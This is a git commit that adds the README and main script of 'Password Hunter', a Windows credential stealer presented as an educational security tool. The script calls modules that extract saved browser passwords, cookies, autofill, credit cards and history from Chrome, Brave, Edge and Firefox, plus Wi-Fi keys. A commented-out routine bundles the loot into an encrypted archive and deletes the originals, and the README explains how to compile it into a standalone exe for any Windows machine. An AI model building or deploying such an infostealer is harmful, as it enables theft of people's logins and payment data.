9cea63c55e3dd68f9353b23a4b9400665fb8d548
Kwitee Gaylah <48332877+KwiteeGaylah@users.noreply.github.com>
2023-04-16 23:28:34 +0530

    Files updated

--- README.md
+++ README.md
@@ -1,2 +1,26 @@
-# passwordhunter
+# Password Hunter
 Password Hunter is a comprehensive security tool designed to extract sensitive information from popular web browsers and devices.The project is aimed at cyber security students and professionals who are interested in web browser and device security.
+
+It is important to note that using this tool on any system or device without the explicit permission of the owner is illegal and considered unethical. The creators of this tool are not responsible for any unlawful or unethical activities carried out using this program.
+
+Therefore, by downloading and using this program, you acknowledge that you are using it for educational purposes only and will not use it for any illegal or unethical activities.
+
+# Installation Instruction
+First, install the required modules
+
+```
+pip3 install requirements.txt
+```
+
+# Usage
+When the program runs, it extracts login credentials from the following web browsers (Chrome, Brave, Edge, Firefox) and also extracts saved Wi-Fi credentials. All these data will be saved in txt files.
+```
+python password_hunter.py
+```
+
+# Convert it to exe to run on any windows machine
+Note: To compile the codes into an executable requires knowledge of the use of pyinstaller, please read more about it before running the below code.
+```
+pyinstaller --onefile --name=PasswordHunter password_hunter.py
+```
+
---
+++ password_hunter.py
@@ -0,0 +1,65 @@
+# Project Title: Password Hunter
+# Member 1: Kwitee D. Gaylah
+# Member 2: Wend-Benedo Simeon ZONGO
+
+#Project Description: A program that extracts data from windows apps and saves them txt files and compress them.
+
+import chrome, firefox, edge, brave, win, os, subprocess
+
+from zipfile import ZipFile
+#from stealth_mode import stealth_mode
+
+#Instances of classes in the imported files
+chrome_obj = chrome.Chrome()
+brave_obj = brave.Brave()
+
+#call functions and methods from the chrome module
+chrome_obj.passwords()
+chrome_obj.cookies()
+chrome_obj.history()
+chrome_obj.web_data()
+
+#call functions and methods from the brave module
+brave_obj.passwords()
+
+#directly calling functions from imported files that doesn't have classes
+win.data_collect()
+firefox.main()
+
+try:
+    edge_user_data = os.path.normpath(fr"{os.environ['USERPROFILE']}\AppData\Local\Microsoft\Edge\User Data")
+    edge.get_edge_creds(edge_user_data, "Microsoft Edge")
+except Exception as e:
+    print(f"[E] {str(e)}")
+
+
+# Uncomment the below lines if you want to compress the extracted file and save them in a .rar file encypted by a password.
+
+
+
+# def compress():
+#     try:
+#         # Prompt the user for a password and validate it
+#         while True:
+#             password = input("Enter a password to encrypt the archive: ")
+#             confirm_password = input("Confirm the password: ")
+#             if password == confirm_password:
+#                 break
+#             else:
+#                 print("Passwords do not match. Please try again.")
+        
+#         # Create a list of the files to compress
+#         files = ["Edge_passwords.txt", "Windowns_WI-FI_Pass.txt", "chrome_passwords.txt", "chrome_cookies.txt", "chrome_autofill.txt", "chrome_credit_cards.txt", "chrome_search_history.txt", "chrome_web_history.txt", "firefox_passwords.txt", "brave_passwords.txt"]
+        
+#         # Use WinRAR to create an encrypted archive
+#         command = ["C:\\Program Files\\WinRAR\\WinRAR.exe", "a", "-hp" + password, "Captured_files.rar"] + files
+#         subprocess.run(command, check=True)
+        
+#         # Remove the original files
+#         for file in files:
+#             os.remove(file)
+#     except Exception as e:
+#         print(f"Error: {e}")
+
+# if __name__ == "__main__":
+#     compress()
